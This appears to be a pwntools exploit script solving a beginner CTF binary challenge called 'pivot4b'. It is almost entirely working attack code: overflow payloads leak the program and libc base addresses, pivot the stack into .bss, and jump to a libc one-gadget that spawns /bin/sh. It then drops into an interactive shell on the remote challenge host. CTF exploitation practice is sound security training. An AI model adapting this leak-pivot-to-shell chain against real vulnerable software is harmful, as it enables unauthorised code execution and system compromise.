#!/usr/bin/python

from pwn import *

# Pass the nc hostname port
CONN = "nc pivot4b-2.challenges.beginners.seccon.jp 12300".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# ===========================================================
#                    WRAPPER FUNCTION
# ===========================================================


def sl(x):
    io.sendline(x)


def sla(x, y):
    io.sendlineafter(x, y)


def se(x):
    io.send(x)


def sa(x, y):
    io.sendafter(x, y)


def ru(x, drop=False):
    return io.recvuntil(x, drop=drop)


def rl():
    return io.recvline()


def cl():
    io.clean()


def un64(x):
    return u64(x.ljust(8, b"\x00"))


def leak(name, addr):
    info(f"{name} @ {hex(addr)}")


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(HOST, PORT, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


def exploit(io):
    # Stage 1 - Leak the puts
    payload = b"\x90" * 0x37 + b"=" + b"\x26"

    sa(b"> ", payload)

    ru(b"=")
    main_plus_74 = un64(rl().strip())
    main = main_plus_74 - 74
    leak("main", main)

    # got elf address
    elf.address = main - elf.sym["main"]

    leak("pie base", elf.address)

    # stg 2 - Leak the libc address
    add_rsp_8_ret = elf.address + 0x0000000000001016  # : add rsp, 8 ; ret
    payload = (
        p64(elf.sym["vuln"])
        + p64(elf.sym["vuln"])
        + cyclic(0x20)
        + p64(elf.bss() + 0x30)
        + p64(elf.sym["vuln"] + 18)
    )

    sa(b"> ", payload)

    offset = 0
    rl()
    funlockfile = un64(rl().strip())
    leak("funlockfile", funlockfile)

    libc.address = funlockfile - 0x0000000000062050
    leak("libc base", libc.address)

    payload = (
        p64(libc.address + 0xEBD43)
        + cyclic(0x28)
        + p64(elf.bss() + 0x330)
        + p64(libc.address + 0xEBD43)
    )
    sa(b"> ", payload)

    # One Gadget
    # 0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
    # constraints:
    #   address rbp-0x50 is writable
    #   rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
    #   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
    # Got Shell?
    io.interactive()


# ===========================================================
#                           SETUP
# ===========================================================


if __name__ == "__main__":
    # Specify GDB script here (breakpoints etc)
    gdbscript = """
    b *vuln+43
    b *vuln+87
    c
    c
    c
    c
    c
    """.format(**locals())

    # Binary filename
    exe = "./chall_patched"

    # This will automatically get context arch, bits, os etc
    elf = context.binary = ELF(exe, checksec=False)
    rop = ROP(elf)

    # Change logging level to help with debugging (error/warning/info/debug)
    context.terminal = "tmux splitw -h".split(" ")
    context.log_level = "debug"
    # context.log_level = "info"

    # Lib-C library, can use pwninit/patchelf to patch binary
    libc = elf.libc
    ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

    if args.REMOTE:
        pass
        libc = ELF("./libc.so.6", checksec=False)
        ld = ELF("./ld-2.35.so", checksec=False)

    io = start()

    exploit(io)
